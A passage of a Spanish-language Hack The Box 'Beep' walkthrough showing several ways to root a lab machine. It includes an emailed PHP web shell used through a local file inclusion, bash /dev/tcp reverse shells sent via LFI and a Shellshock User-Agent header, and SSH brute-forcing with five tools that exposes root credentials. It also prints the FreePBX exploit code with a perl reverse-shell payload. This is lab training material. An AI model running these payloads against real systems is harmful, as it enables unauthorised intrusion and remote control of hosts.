+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ swaks --to asterisk@localhost --from wixnic@helo.htb --header <span class=s2>&#34;Subject: Shell&#34;</span> --body <span class=s1>&#39;PHP code: &lt;?php system($_REQUEST[&#34;cmd&#34;]); ?&gt;&#39;</span> --server 10.10.10.7
+<span class=o>===</span> Trying 10.10.10.7:25...
+<span class=o>===</span> Connected to 10.10.10.7.
+&lt;-  <span class=m>220</span> beep.localdomain ESMTP Postfix
+ -&gt; EHLO kali
+&lt;-  250-beep.localdomain
+&lt;-  250-PIPELINING
+&lt;-  250-SIZE <span class=m>10240000</span>
+&lt;-  250-VRFY
+&lt;-  250-ETRN
+&lt;-  250-ENHANCEDSTATUSCODES
+&lt;-  250-8BITMIME
+&lt;-  <span class=m>250</span> DSN
+ -&gt; MAIL FROM:&lt;wixnic@helo.htb&gt;
+&lt;-  <span class=m>250</span> 2.1.0 Ok
+ -&gt; RCPT TO:&lt;asterisk@localhost&gt;
+&lt;-  <span class=m>250</span> 2.1.5 Ok
+ -&gt; DATA
+&lt;-  <span class=m>354</span> End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;
+ -&gt; Date: Wed, <span class=m>22</span> Dec <span class=m>2021</span> 19:07:02 -0500
+ -&gt; To: asterisk@localhost
+ -&gt; From: wixnic@helo.htb
+ -&gt; Subject: Shell
+ -&gt; Message-Id: &lt;20211222190702.277580@kali&gt;
+ -&gt; X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/
+ -&gt;
+ -&gt; PHP code: &lt;?php system<span class=o>(</span><span class=nv>$_REQUEST</span><span class=o>[</span><span class=s2>&#34;cmd&#34;</span><span class=o>])</span><span class=p>;</span> ?&gt;
+ -&gt;
+ -&gt;
+ -&gt; .
+&lt;-  <span class=m>250</span> 2.0.0 Ok: queued as D7063D92FD
+ -&gt; QUIT
+&lt;-  <span class=m>221</span> 2.0.0 <span class=nv>Bye</span>
+<span class=o>===</span> Connection closed with remote host.
+</code></pre></td></tr></table>
+</div>
+</div><p>Ahora podemos leer ese archivo con la LFI en y añadir <code>&cmd=id</code> al final de la URL, para ejecutar comandos del sistema:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>curl -sk <span class=s2>&#34;https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../../var/mail/asterisk%00&amp;module=Accounts&amp;action&amp;cmd=id&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>En lugar de <code>id</code>, vamos añadir una shell inversa, también voy a codificar los datos, en este caso el código de la shell inversa con <code>--data-urlencode</code>:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ curl -sk <span class=s2>&#34;https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../../var/mail/asterisk%00&amp;module=Accounts&amp;action&#34;</span> --data-urlencode <span class=s2>&#34;cmd=bash -i &gt;&amp; /dev/tcp/10.10.16.3/443 0&gt;&amp;1&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Ahora recibimos una shell:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ sudo nc -lvnp <span class=m>443</span>
+listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>443</span> ...
+connect to <span class=o>[</span>10.10.16.3<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.10.7<span class=o>]</span> <span class=m>59168</span>
+bash: no job control in this shell
+bash-3.2$ id
+<span class=nv>uid</span><span class=o>=</span>100<span class=o>(</span>asterisk<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>101<span class=o>(</span>asterisk<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>101<span class=o>(</span>asterisk<span class=o>)</span>
+bash-3.2$ whoami
+asterisk
+</code></pre></td></tr></table>
+</div>
+</div><h2 id=ssh---tcp-22-path-2>SSH - TCP 22 [Path #2]</h2>
+<p>Podemos intentar la fuerza bruta de SSH:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ crackmapexec ssh 10.10.10.7 -u htb/box/Beep/users.txt  -p passwords.txt
+SSH         10.10.10.7      <span class=m>22</span>     10.10.10.7       <span class=o>[</span>*<span class=o>]</span> SSH-2.0-OpenSSH_4.3
+SSH         10.10.10.7      <span class=m>22</span>     10.10.10.7       <span class=o>[</span>-<span class=o>]</span> root:amp109 Authentication failed.
+SSH         10.10.10.7      <span class=m>22</span>     10.10.10.7       <span class=o>[</span>+<span class=o>]</span> root:jEhdIekWmdjE <span class=o>(</span>Pwn3d!<span class=o>)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>También podemos utilizar la hidra:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ hydra -L htb/box/Beep/users.txt -P passwords.txt -s <span class=m>22</span> ssh://10.10.10.7 -v -t <span class=m>4</span>
+Hydra v9.1 <span class=o>(</span>c<span class=o>)</span> <span class=m>2020</span> by van Hauser/THC <span class=p>&amp;</span> David Maciejak - Please <span class=k>do</span> not use in military or secret service organizations, or <span class=k>for</span> illegal purposes <span class=o>(</span>this is non-binding, these *** ignore laws and ethics anyway<span class=o>)</span>.
+
+Hydra <span class=o>(</span>https://github.com/vanhauser-thc/thc-hydra<span class=o>)</span> starting at 2021-12-22 18:37:00
+<span class=o>[</span>DATA<span class=o>]</span> max <span class=m>4</span> tasks per <span class=m>1</span> server, overall <span class=m>4</span> tasks, <span class=m>24</span> login tries <span class=o>(</span>l:6/p:4<span class=o>)</span>, ~6 tries per task
+<span class=o>[</span>DATA<span class=o>]</span> attacking ssh://10.10.10.7:22/
+<span class=o>[</span>VERBOSE<span class=o>]</span> Resolving addresses ... <span class=o>[</span>VERBOSE<span class=o>]</span> resolving <span class=k>done</span>
+<span class=o>[</span>INFO<span class=o>]</span> Testing <span class=k>if</span> password authentication is supported by ssh://root@10.10.10.7:22
+<span class=o>[</span>INFO<span class=o>]</span> Successful, password authentication is supported by ssh://10.10.10.7:22
+<span class=o>[</span>22<span class=o>][</span>ssh<span class=o>]</span> host: 10.10.10.7   login: root   password: jEhdIekWmdjE
+</code></pre></td></tr></table>
+</div>
+</div><p>Alternativamente, el patator también es útil:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ patator ssh_login <span class=nv>host</span><span class=o>=</span>10.10.10.7 <span class=nv>port</span><span class=o>=</span><span class=m>22</span> <span class=nv>user</span><span class=o>=</span>FILE0 <span class=nv>password</span><span class=o>=</span>FILE1 <span class=nv>0</span><span class=o>=</span>htb/box/Beep/users.txt <span class=nv>1</span><span class=o>=</span>passwords.txt
+18:39:49 patator    INFO - Starting Patator 0.9 <span class=o>(</span>https://github.com/lanjelot/patator<span class=o>)</span> with python-3.9.8 at 2021-12-22 18:39 EST
+18:39:49 patator    INFO -
+18:39:49 patator    INFO - code  size    <span class=nb>time</span> <span class=p>|</span> candidate                          <span class=p>|</span>   num <span class=p>|</span> mesg
+18:39:49 patator    INFO - -----------------------------------------------------------------------------
+18:40:01 patator    INFO - <span class=m>0</span>     <span class=m>19</span>    10.516 <span class=p>|</span> root:jEhdIekWmdjE                  <span class=p>|</span>     <span class=m>2</span> <span class=p>|</span> SSH-2.0-OpenSSH_4.3
+</code></pre></td></tr></table>
+</div>
+</div><p>Ncrack también es una opción:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ ncrack -p <span class=m>22</span> -U htb/box/Beep/users.txt -P passwords.txt 10.10.10.7 -T <span class=m>5</span>
+
+Starting Ncrack 0.7 <span class=o>(</span> http://ncrack.org <span class=o>)</span> at 2021-12-22 18:41 EST
+
+Discovered credentials <span class=k>for</span> ssh on 10.10.10.7 22/tcp:
+10.10.10.7 22/tcp ssh: <span class=s1>&#39;root&#39;</span> <span class=s1>&#39;jEhdIekWmdjE&#39;</span>
+
+Ncrack <span class=k>done</span>: <span class=m>1</span> service scanned in 42.01 seconds.
+
+Ncrack finished.
+</code></pre></td></tr></table>
+</div>
+</div><p>Oh, medusa también lo es:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ medusa -h 10.10.10.7 -U htb/box/Beep/users.txt -P passwords.txt -M ssh 10.10.10.7
+Medusa v2.2 <span class=o>[</span>http://www.foofus.net<span class=o>]</span> <span class=o>(</span>C<span class=o>)</span> JoMo-Kun / Foofus Networks &lt;jmk@foofus.net&gt;
+
+ACCOUNT CHECK: <span class=o>[</span>ssh<span class=o>]</span> Host: 10.10.10.7 <span class=o>(</span><span class=m>1</span> of 1, <span class=m>0</span> <span class=nb>complete</span><span class=o>)</span> User: root <span class=o>(</span><span class=m>1</span> of 6, <span class=m>0</span> <span class=nb>complete</span><span class=o>)</span> Password: amp109 <span class=o>(</span><span class=m>1</span> of <span class=m>4</span> <span class=nb>complete</span><span class=o>)</span>
+ACCOUNT CHECK: <span class=o>[</span>ssh<span class=o>]</span> Host: 10.10.10.7 <span class=o>(</span><span class=m>1</span> of 1, <span class=m>0</span> <span class=nb>complete</span><span class=o>)</span> User: root <span class=o>(</span><span class=m>1</span> of 6, <span class=m>0</span> <span class=nb>complete</span><span class=o>)</span> Password: jEhdIekWmdjE <span class=o>(</span><span class=m>2</span> of <span class=m>4</span> <span class=nb>complete</span><span class=o>)</span>
+ACCOUNT FOUND: <span class=o>[</span>ssh<span class=o>]</span> Host: 10.10.10.7 User: root Password: jEhdIekWmdjE <span class=o>[</span>SUCCESS<span class=o>]</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Vale, ya está bien&mldr; ¡para!</p>
+<p>Una vez dicho esto, sólo tienes que entrar en ssh con esas credenciales válidas:</p>
+<blockquote>
+<p>Username: root
+Pasword: jEhdIekWmdjE</p>
+</blockquote>
+<p>Pero oh no&mldr; podrías tener un problema de algoritmo de intercambio de claves:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ ssh root@10.10.10.7
+Unable to negotiate with 10.10.10.7 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
+</code></pre></td></tr></table>
+</div>
+</div><p>Puedes solucionarlo fácilmente, especificando uno de los algoritmos que ofrecen e iniciando sesión como root:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ ssh -oKexAlgorithms<span class=o>=</span>diffie-hellman-group-exchange-sha1 root@10.10.10.7
+The authenticity of host <span class=s1>&#39;10.10.10.7 (10.10.10.7)&#39;</span> can<span class=s1>&#39;t be established.
+</span><span class=s1>RSA key fingerprint is SHA256:Ip2MswIVDX1AIEPoLiHsMFfdg1pEJ0XXD5nFEjki/hI.
+</span><span class=s1>This key is not known by any other names
+</span><span class=s1>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span><span class=s1>Warning: Permanently added &#39;</span>10.10.10.7<span class=s1>&#39; (RSA) to the list of known hosts.
+</span><span class=s1>root@10.10.10.7&#39;</span>s password:
+Last login: Tue Jul <span class=m>16</span> 11:45:47 <span class=m>2019</span>
+
+Welcome to Elastix
+----------------------------------------------------
+
+To access your Elastix System, using a separate workstation <span class=o>(</span>PC/MAC/Linux<span class=o>)</span>
+Open the Internet Browser using the following URL:
+http://10.10.10.7
+
+<span class=o>[</span>root@beep ~<span class=o>]</span><span class=c1># id</span>
+<span class=nv>uid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span>,1<span class=o>(</span>bin<span class=o>)</span>,2<span class=o>(</span>daemon<span class=o>)</span>,3<span class=o>(</span>sys<span class=o>)</span>,4<span class=o>(</span>adm<span class=o>)</span>,6<span class=o>(</span>disk<span class=o>)</span>,10<span class=o>(</span>wheel<span class=o>)</span>
+<span class=o>[</span>root@beep ~<span class=o>]</span><span class=c1># ip a</span>
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span class=m>16436</span> qdisc noqueue
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class=m>1500</span> qdisc pfifo_fast qlen <span class=m>1000</span>
+    link/ether 00:50:56:b9:1d:bb brd ff:ff:ff:ff:ff:ff
+    inet 10.10.10.7/24 brd 10.10.10.255 scope global eth0
+<span class=o>[</span>root@beep ~<span class=o>]</span><span class=c1>#</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id=webmin---tcp-10000>Webmin - TCP 10000</h2>
+<p>Webmin está alojado en el puerto TCP 10000 con SSL:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ curl -Isk <span class=s2>&#34;http://10.10.10.7:10000/&#34;</span>
+HTTP/1.0 <span class=m>200</span> Bad Request
+Server: MiniServ/1.570
+Date: Wed, <span class=m>22</span> Dec <span class=m>2021</span> 23:33:57 GMT
+Content-type: text/html<span class=p>;</span> <span class=nv>Charset</span><span class=o>=</span>iso-8859-1
+Connection: close
+
+❯ curl -Isk <span class=s2>&#34;https://10.10.10.7:10000/&#34;</span>
+HTTP/1.0 <span class=m>200</span> Document follows
+Date: Wed, <span class=m>22</span> Dec <span class=m>2021</span> 23:34:04 GMT
+Server: MiniServ/1.570
+Connection: close
+Set-Cookie: <span class=nv>testing</span><span class=o>=</span>1<span class=p>;</span> <span class=nv>path</span><span class=o>=</span>/<span class=p>;</span> secure
+pragma: no-cache
+Expires: Thu, <span class=m>1</span> Jan <span class=m>1970</span> 00:00:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Cache-Control: post-check<span class=o>=</span>0, pre-check<span class=o>=</span><span class=m>0</span>
+Content-type: text/html<span class=p>;</span> <span class=nv>Charset</span><span class=o>=</span>iso-8859-1
+</code></pre></td></tr></table>
+</div>
+</div><p>Webmin es una interfaz web para gestionar sistemas Unix.</p>
+<h2 id=shellshock-path-3>Shellshock [Path #3]</h2>
+<p>Cada vez que hay CGI o un Script en una aplicación web, es bueno intentar probar ShellShock. Para probarlo, abriré burpsuite y enviaré la petición de inicio de sesión a Repeater y reemplazaré la cabecera User-Agent con la cadena del exploit Shellshock <code>() { :; };[cmd]</code>, comenzando con un sleep de 5 segundos:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=err>User-Agent: () { :; };sleep 5
+</span></code></pre></td></tr></table>
+</div>
+</div><p>Si recibimos una respuesta en 5 segundos entonces funciona y eso confirmará que es vulnerable a shellshock. Vamos a intentar hacer un ping a nosotros mismos.</p>
+<p>Configurar un oyente/listener en ICMP:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>sudo tcpdump -ni tun0 icmp
+</code></pre></td></tr></table>
+</div>
+</div><p>Crea una única petición de ping con <code>-c 1</code>:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=err>User-Agent: () { :; };ping -c 1 10.10.16.3
+</span></code></pre></td></tr></table>
+</div>
+</div><p>Y recibimos una conexión:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ sudo tcpdump -ni tun0 icmp
+<span class=o>[</span>sudo<span class=o>]</span> password <span class=k>for</span> kali:
+tcpdump: verbose output suppressed, use -v<span class=o>[</span>v<span class=o>]</span>... <span class=k>for</span> full protocol decode
+listening on tun0, link-type RAW <span class=o>(</span>Raw IP<span class=o>)</span>, snapshot length <span class=m>262144</span> bytes
+18:56:11.688169 IP 10.10.10.7 &gt; 10.10.16.3: ICMP <span class=nb>echo</span> request, id 20511, seq 1, length <span class=m>64</span>
+18:56:11.688182 IP 10.10.16.3 &gt; 10.10.10.7: ICMP <span class=nb>echo</span> reply, id 20511, seq 1, length <span class=m>64</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Establezcamos una shell inversa:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>User-Agent: <span class=o>()</span> <span class=o>{</span> :<span class=p>;</span> <span class=o>}</span><span class=p>;</span>bash -i &gt;<span class=p>&amp;</span> /dev/tcp/10.10.16.3/443 0&gt;<span class=p>&amp;</span><span class=m>1</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Recibimos una conexión como root:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ sudo nc -lvnp <span class=m>443</span>
+listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>443</span> ...
+connect to <span class=o>[</span>10.10.16.3<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.10.7<span class=o>]</span> <span class=m>59290</span>
+bash: no job control in this shell
+<span class=o>[</span>root@beep webmin<span class=o>]</span><span class=c1># id</span>
+<span class=nv>uid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span>
+<span class=o>[</span>root@beep webmin<span class=o>]</span><span class=c1># whoami</span>
+root
+</code></pre></td></tr></table>
+</div>
+</div><h2 id=webmin-command-path-4>Webmin Command [Path #4]</h2>
+<p>Podemos acceder a webmin con las credenciales root:jEhdIekWmdjE.</p>
+<p>![[webmin-admin-page.png]]</p>
+<p>Esta interfaz está diseñada para administrar el sistema y tenemos acceso de root debido a las credenciales que encontramos antes, así que podemos crear una tarea como root:</p>
+<p>![[schedule-command.png]]</p>
+<p>![[schedule-command-created.png]]</p>
+<p>En un minuto (dependiendo del tiempo que les hayas dado), el script se ejecutará y obtendremos una shell inversa:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ nc -lvnp <span class=m>443</span>
+listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>443</span> ...
+connect to <span class=o>[</span>10.10.16.4<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.10.7<span class=o>]</span> <span class=m>43947</span>
+bash: no job control in this shell
+<span class=o>[</span>root@beep /<span class=o>]</span><span class=c1># id</span>
+<span class=nv>uid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span>,1<span class=o>(</span>bin<span class=o>)</span>,2<span class=o>(</span>daemon<span class=o>)</span>,3<span class=o>(</span>sys<span class=o>)</span>,4<span class=o>(</span>adm<span class=o>)</span>,6<span class=o>(</span>disk<span class=o>)</span>,10<span class=o>(</span>wheel<span class=o>)</span>
+<span class=o>[</span>root@beep /<span class=o>]</span><span class=c1># whoami</span>
+root
+</code></pre></td></tr></table>
+</div>
+</div><h2 id=freepbx-2100--elastix-220---remote-code-execution-path-5>FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution [Path #5]</h2>
+<p>Como sabemos que FreePBX está funcionando en este servidor, podemos probar este POC:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ searchsploit elastix freepbx
+----------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                           <span class=p>|</span>  Path
+----------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                                                                                   <span class=p>|</span> php/webapps/18650.py
+----------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+</code></pre></td></tr></table>
+</div>
+</div><p>Mirando el exploit podemos ver un payload:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=kn>import</span> <span class=nn>urllib</span>
+<span class=kn>import</span> <span class=nn>ssl</span>
+<span class=n>rhost</span><span class=o>=</span><span class=s2>&#34;10.10.10.7&#34;</span> <span class=c1># add the target IP</span>
+<span class=n>lhost</span><span class=o>=</span><span class=s2>&#34;10.10.16.3&#34;</span> <span class=c1># add your IP</span>
+<span class=n>lport</span><span class=o>=</span><span class=mi>443</span> <span class=c1># change the port</span>
+<span class=n>extension</span><span class=o>=</span><span class=s2>&#34;1000&#34;</span> <span class=c1># change the extension number with a valid number</span>
+
+<span class=n>ssl</span><span class=o>.</span><span class=n>_create_default_https_context</span> <span class=o>=</span> <span class=n>ssl</span><span class=o>.</span><span class=n>_create_unverified_context</span>
+
+<span class=c1># Reverse shell payload</span>
+
+<span class=n>url</span> <span class=o>=</span> <span class=s1>&#39;https://&#39;</span><span class=o>+</span><span class=nb>str</span><span class=p>(</span><span class=n>rhost</span><span class=p>)</span><span class=o>+</span><span class=s1>&#39;/recordings/misc/callme_page.php?action=c&amp;callmenum=&#39;</span><span class=o>+</span><span class=nb>str</span><span class=p>(</span><span class=n>extension</span><span class=p>)</span><span class=o>+</span><span class=s1>&#39;@from-internal/n%0D%0AApplication:</span><span class=si>%20s</span><span class=s1>ystem%0D%0AData:%20perl%20-MIO%20-e</span><span class=si>%20%</span><span class=s1>27%24p</span><span class=si>%3d</span><span class=s1>fork%3bexit</span><span class=si>%2c</span><span class=s1>if</span><span class=si>%28%</span><span class=s1>24p</span><span class=si>%29%</span><span class=s1>3b</span><span class=si>%24c%3d</span><span class=s1>new%20IO</span><span class=si>%3a%3a</span><span class=s1>Socket</span><span class=si>%3a%3a</span><span class=s1>INET%28PeerAddr</span><span class=si>%2c</span><span class=s1>%22&#39;</span><span class=o>+</span><span class=nb>str</span><span class=p>(</span><span class=n>lhost</span><span class=p>)</span><span class=o>+</span><span class=s1>&#39;</span><span class=si>%3a</span><span class=s1>&#39;</span><span class=o>+</span><span class=nb>str</span><span class=p>(</span><span class=n>lport</span><span class=p>)</span><span class=o>+</span><span class=s1>&#39;</span><span class=si>%22%</span><span class=s1>29%3bSTDIN-</span><span class=si>%3e</span><span class=s1>fdopen</span><span class=si>%28%</span><span class=s1>24c</span><span class=si>%2c</span><span class=s1>r</span><span class=si>%29%</span><span class=s1>3b</span><span class=si>%24%</span><span class=s1>7e-</span><span class=si>%3e</span><span class=s1>fdopen</span><span class=si>%28%</span><span class=s1>24c</span><span class=si>%2c</span><span class=s1>w</span><span class=si>%29%</span><span class=s1>3bsystem</span><span class=si>%24%</span><span class=s1>5f%20while</span><span class=si>%3c%3e</span><span class=s1>%3b</span><span class=si>%27%</span><span class=s1>0D%0A%0D%0A&#39;</span>
+
+<span class=n>urllib</span><span class=o>.</span><span class=n>urlopen</span><span class=p>(</span><span class=n>url</span><span class=p>)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Tenemos que modificar lo siguiente:</p>
+<ul>
+<li>Cambiar la IP del Host Remoto por la IP de destino</li>
+<li>Cambiar la IP del Host Local por la nuestra.</li>
